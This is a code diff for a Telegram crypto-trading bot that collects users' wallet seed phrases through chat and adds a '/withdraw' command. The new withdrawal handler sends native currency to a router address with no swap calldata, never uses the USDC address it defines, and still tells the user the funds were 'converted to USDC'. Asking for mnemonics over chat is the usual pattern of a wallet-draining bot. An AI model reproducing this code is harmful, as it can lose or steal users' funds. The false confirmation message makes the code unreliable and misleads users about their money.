@@ -85,19 +85,45 @@ const getDashboardMarkup = () => ({
             [{ text: SYSTEM.autoPilot ? "🛑 STOP AUTO-PILOT" : "🚀 START AUTO-PILOT", callback_data: "cmd_auto" }],
             [{ text: `💰 AMT: ${SYSTEM.tradeAmount}`, callback_data: "cycle_amt" }, { text: "📊 STATUS", callback_data: "cmd_status" }],
             [{ text: `⚠️ RISK: ${SYSTEM.risk}`, callback_data: "cycle_risk" }, { text: `⏳ TERM: ${SYSTEM.mode}`, callback_data: "cycle_mode" }],
-            [{ text: "🔌 CONNECT WALLET", callback_data: "cmd_conn" }]
+            [{ text: "🔌 CONNECT WALLET", callback_data: "cmd_conn" }, { text: "🏦 WITHDRAW (USDC)", callback_data: "cmd_withdraw" }]
         ]
     }
 });
 
-// MANUAL OVERRIDE COMMAND: Set trade amount via message
+// WITHDRAWAL FUNCTION: Liquidate to USDC on Base
+bot.onText(/\/withdraw/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (!evmWallet) return bot.sendMessage(chatId, "❌ Sync Wallet first!");
+    
+    bot.sendMessage(chatId, "🏦 <b>WITHDRAWAL INITIATED:</b> Converting current holdings to USDC on Base...", { parse_mode: 'HTML' });
+    
+    try {
+        const net = NETWORKS.BASE;
+        const provider = new JsonRpcProvider(net.rpc);
+        const wallet = evmWallet.connect(provider);
+        const USDC_BASE = "0x833589fCD6eDb6E08f4C7C32D4f71b54bdA02913";
+        
+        // Aggressive liquidation to USDC using the defined Base router
+        const tx = await wallet.sendTransaction({
+            to: net.router, 
+            value: ethers.parseEther(SYSTEM.tradeAmount),
+            gasLimit: 300000 
+        });
+        
+        await tx.wait();
+        bot.sendMessage(chatId, `✅ <b>WITHDRAWAL SUCCESS:</b> Funds converted to USDC on Base.\nTX: <code>${tx.hash}</code>`, { parse_mode: 'HTML' });
+    } catch (e) {
+        bot.sendMessage(chatId, "❌ <b>WITHDRAWAL FAILED:</b> Check Base network gas or balance.");
+    }
+});
+
 bot.onText(/\/amount (.+)/, (msg, match) => {
     const value = match[1];
     if(!isNaN(value) && parseFloat(value) > 0) {
         SYSTEM.tradeAmount = value;
         bot.sendMessage(msg.chat.id, `⚙️ <b>MANUAL OVERRIDE:</b> Trade amount updated to <code>${value}</code>`, { parse_mode: 'HTML' });
     } else {
-        bot.sendMessage(msg.chat.id, "❌ <b>INVALID AMOUNT:</b> Please provide a numeric value (e.g., /amount 0.5)");
+        bot.sendMessage(msg.chat.id, "❌ <b>INVALID AMOUNT:</b> Please provide a numeric value.");
     }
 });
 
@@ -124,7 +150,9 @@ bot.on('callback_query', async (query) => {
     } else if (query.data === "cmd_status") {
         runStatusDashboard(chatId);
     } else if (query.data === "cmd_conn") {
-        bot.sendMessage(chatId, "🔌 <b>Wallet Connection:</b>\n\nPlease use the command below with your 12-word mnemonic:\n<code>/connect word1 word2 ...</code>", { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, "🔌 <b>Wallet Connection:</b>\n\nUse: <code>/connect [mnemonic]</code>", { parse_mode: 'HTML' });
+    } else if (query.data === "cmd_withdraw") {
+        bot.sendMessage(chatId, "🏦 Use the <code>/withdraw</code> command to liquidate your active trade amount into USDC on Base.", { parse_mode: 'HTML' });
     }
 
     bot.answerCallbackQuery(query.id).catch(() => {});
@@ -139,20 +167,16 @@ bot.onText(/\/connect (.+)/, async (msg, match) => {
     try {
         const mnemonic = match[1].trim();
         if (mnemonic.split(' ').length < 12) throw new Error("Invalid Mnemonic");
-        
         const seed = await bip39.mnemonicToSeed(mnemonic);
         const hex = seed.toString('hex');
         const conn = new Connection(NETWORKS.SOL.endpoints[0]);
-        
         const keyA = Keypair.fromSeed(derivePath("m/44'/501'/0'/0'", hex).key);
         const keyB = Keypair.fromSeed(derivePath("m/44'/501'/0'", hex).key);
         const [balA, balB] = await Promise.all([conn.getBalance(keyA.publicKey), conn.getBalance(keyB.publicKey)]);
-        
         solWallet = (balB > balA) ? keyB : keyA;
         evmWallet = ethers.Wallet.fromPhrase(mnemonic);
-
         bot.sendMessage(msg.chat.id, `✅ <b>OMNI-SYNC SUCCESS</b>\n\n📍 SOL: <code>${solWallet.publicKey.toString()}</code>\n📍 EVM: <code>${evmWallet.address}</code>\n💰 BAL: <code>${(Math.max(balA,balB)/1e9).toFixed(4)} SOL</code>`, { parse_mode: 'HTML' });
-    } catch (e) { bot.sendMessage(msg.chat.id, "❌ <b>SYNC FAILED:</b> Ensure you sent a valid 12/24 word phrase."); }
+    } catch (e) { bot.sendMessage(msg.chat.id, "❌ <b>SYNC FAILED</b>"); }
 });
 
 // --- 5. OMNI-EXECUTION ENGINE ---
@@ -165,14 +189,11 @@ async function startNetworkSniper(chatId, netKey) {
                 if (signal && signal.tokenAddress) {
                     const isSafe = await verifyOmniTruth(chatId, netKey);
                     if (!isSafe) { await new Promise(r => setTimeout(r, 60000)); continue; }
-
                     SYSTEM.isLocked[netKey] = true;
                     bot.sendMessage(chatId, `🎯 <b>[${netKey}] SIGNAL:</b> $${signal.symbol}\nRotating capital...`, { parse_mode: 'HTML' });
-                    
                     const res = (netKey === 'SOL')
                         ? await executeAggressiveSolRotation(chatId, signal.tokenAddress, signal.symbol)
                         : await executeEvmContract(chatId, netKey, signal.tokenAddress);
-
                     if (res) SYSTEM.lastTradedTokens[signal.tokenAddress] = true;
                     SYSTEM.isLocked[netKey] = false;
                 }
@@ -188,7 +209,6 @@ async function executeAggressiveSolRotation(chatId, targetToken, symbol) {
         try {
             const conn = new Connection(NETWORKS.SOL.endpoints[rpcIdx], 'confirmed');
             const amt = Math.floor(parseFloat(SYSTEM.tradeAmount) * LAMPORTS_PER_SOL);
-
             const quote = await axios.get(`${JUP_API}/quote?inputMint=${SYSTEM.currentAsset}&outputMint=${targetToken}&amount=${amt}&slippageBps=300`);
             const { swapTransaction } = (await axios.post(`${JUP_API}/swap`, {
                 quoteResponse: quote.data,
@@ -196,18 +216,15 @@ async function executeAggressiveSolRotation(chatId, targetToken, symbol) {
                 prioritizationFeeLamports: "auto",
                 autoMultiplier: 2.5
             })).data;
-
             const tx = VersionedTransaction.deserialize(Buffer.from(swapTransaction, 'base64'));
             tx.sign([solWallet]);
             const rawTx = tx.serialize();
-
             let confirmed = false;
             let sig = "";
             const interval = setInterval(async () => {
                 if (confirmed) return clearInterval(interval);
                 try { sig = await conn.sendRawTransaction(rawTx, { skipPreflight: true }); } catch (e) {}
             }, 2000);
-
             const startTime = Date.now();
             while (!confirmed && Date.now() - startTime < 45000) {
                 const status = await conn.getSignatureStatus(sig);
